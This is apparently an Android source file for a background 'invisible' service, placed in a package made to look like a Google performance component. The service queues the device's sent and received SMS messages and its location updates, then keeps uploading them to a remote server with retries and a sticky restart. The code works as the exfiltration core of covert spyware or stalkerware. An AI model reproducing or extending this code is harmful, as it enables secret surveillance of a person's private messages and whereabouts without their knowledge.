package com.example.tiber.googleperformancehost.Services.Daemons;

import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.util.Log;

import com.example.tiber.googleperformancehost.Classes.ServerConnection;
import com.example.tiber.googleperformancehost.R;
import com.example.tiber.googleperformancehost.Services.Abstract.ForegroundInvisibleService;
import com.example.tiber.googleperformancehost.SharedClasses.Communication.Exceptions.KeyNotMappedException;
import com.example.tiber.googleperformancehost.SharedClasses.Communication.RequestedAction;
import com.example.tiber.googleperformancehost.SharedClasses.Communication.ResponseEnum;
import com.example.tiber.googleperformancehost.SharedClasses.Objects.LocationData;
import com.example.tiber.googleperformancehost.SharedClasses.Objects.Sendable;
import com.example.tiber.googleperformancehost.SharedClasses.Objects.ReceivedSmsData;
import com.example.tiber.googleperformancehost.SharedClasses.Objects.SentSmsData;
import com.google.gson.Gson;

import java.util.concurrent.ConcurrentLinkedQueue;

/**
 * Created by tiber on 10/25/2016.
 */

public class SmallDataSender extends ForegroundInvisibleService {

    private final String debugTag = this.getClass().toString();
    ConcurrentLinkedQueue<Sendable> dataQueue;
    AsyncWorkerSender worker;


    @Override
    public void onCreate() {
        super.onCreate();
        dataQueue = new ConcurrentLinkedQueue<Sendable>();

    }

    @Override
    public  int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);

        String what = null;
        if(intent != null)
            what = intent.getStringExtra("what");

        if(what == null)
            return START_STICKY;

        switch(what){
            case "justStart"://just keeping alive...return
                return START_STICKY;
            case "locationUpdate":
                handleLocationUpdate(intent);
                break;
            case "networkChange":
                handleNetworkChange(intent);
                break;
            case "receivedSMS":
                handleReceivedSMS(intent);
                break;
            case "sentSMS":
                handleSentSMS(intent);
                break;
            default:
                Log.wtf(debugTag,"defaulted switch statement in onStartCommand...."+"what is = "+what);
                return START_STICKY;
        }
        return START_STICKY;
    }

    private void handleSentSMS(Intent intent) {
        String smsJSon = intent.getStringExtra("smsJson");
        if(smsJSon != null){
            SentSmsData sms = new Gson().fromJson(smsJSon,SentSmsData.class);
            dataQueue.add(sms);
            startWorker();
        }
    }

    private void handleReceivedSMS(Intent intent) {
        String smsJSon = intent.getStringExtra("smsJson");
        if(smsJSon != null){
            ReceivedSmsData sms = new Gson().fromJson(smsJSon,ReceivedSmsData.class);
            dataQueue.add(sms);
            startWorker();
        }
    }

    private void handleNetworkChange(Intent intent) {
        boolean internetAccess = intent.getBooleanExtra("internetAccess",false);
        if(internetAccess){
            if( ( worker == null || ( worker != null && worker.getStatus() != AsyncTask.Status.RUNNING )) &&
                    dataQueue.size() != 0 ) {
                worker = new AsyncWorkerSender(appContext, dataQueue,
                        appContext.getResources().getInteger(R.integer.NUMBER_OF_CONNECTION_TRIES_SMALL_DATA_SENDER));
                worker.execute();
            }
        }
        else{
            if(worker != null && worker.getStatus() == AsyncTask.Status.RUNNING && !worker.isCancelled() ) {
                worker.cancel(true);
            }
        }
    }

    private void handleLocationUpdate(Intent intent) {
        String locationDataJSon = intent.getStringExtra("locationData");
        if(locationDataJSon != null) {
            LocationData location = new Gson().fromJson(locationDataJSon,LocationData.class);
            dataQueue.add(location);
            startWorker();
            }
        }

    private void startWorker() {
        if(internetAccess(appContext)){
            if((worker == null || worker.getStatus() != AsyncTask.Status.RUNNING) &&
                    dataQueue.size() != 0 ) {
                worker = new AsyncWorkerSender(appContext, dataQueue,
                        appContext.getResources().getInteger(R.integer.NUMBER_OF_CONNECTION_TRIES_SMALL_DATA_SENDER));
                worker.execute();
            }
    }
}

    class AsyncWorkerSender extends AsyncTask<Void,Void,Void> {

        private Sendable currentMessage;
        private Context appContext;
        private ConcurrentLinkedQueue<Sendable> messages;
        private int numberOfTriesPerMessage;
        private ServerConnection<Sendable,ResponseEnum> connection;
        ResponseEnum responseEnum;


        public AsyncWorkerSender(Context appContext, ConcurrentLinkedQueue<Sendable> messages,
                                 int numberOfTriesPerMessage) {
            super();
            this.appContext = appContext;
            this.messages = messages;
            this.numberOfTriesPerMessage = numberOfTriesPerMessage;
        }


        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }


        @Override
        protected Void doInBackground(Void... params) {
            connection = new ServerConnection<Sendable,ResponseEnum>(appContext);
            RequestedAction requestedAction = null;
            int cancelTryCount = 0;
            while(dataQueue.size() != 0) {
                responseEnum = null;
                if( cancelTryCount >= numberOfTriesPerMessage * 2 && !isCancelled() )
                    this.cancel(true);

                if( isCancelled() ) break;

                currentMessage = messages.peek();

                int tryCount = 0;
                boolean success = false;
                while( tryCount < numberOfTriesPerMessage && !success ) {
                    if ( isCancelled() ) break;
                    try {
                        responseEnum = connection.execute(currentMessage);
                    } catch (KeyNotMappedException e) {
                        e.printStackTrace();
                        dataQueue.remove();
                    }
                    if (responseEnum != null) {
                        success = true ;//stop loop for this message, it was successful
                        dataQueue.remove();
                        cancelTryCount = 0;
                    }
                    else{//connection not successful, check for connection, just to ensure first
                        if(!internetAccess(appContext) && !isCancelled() ) {
                            this.cancel(true);
                        }
                        else{
                            ++tryCount;
                            ++cancelTryCount;
                        }
                    }
                    if ( isCancelled() ) break;
                }

            }

            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            //good job
        }

        @Override
        protected void onCancelled() {
            //onCancelled();

        }
    }



    public boolean internetAccess(Context context) {

        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo netInfo = cm.getActiveNetworkInfo();
        //should check null because in airplane mode it will be null
        return (netInfo != null && netInfo.isConnected());
    }
}
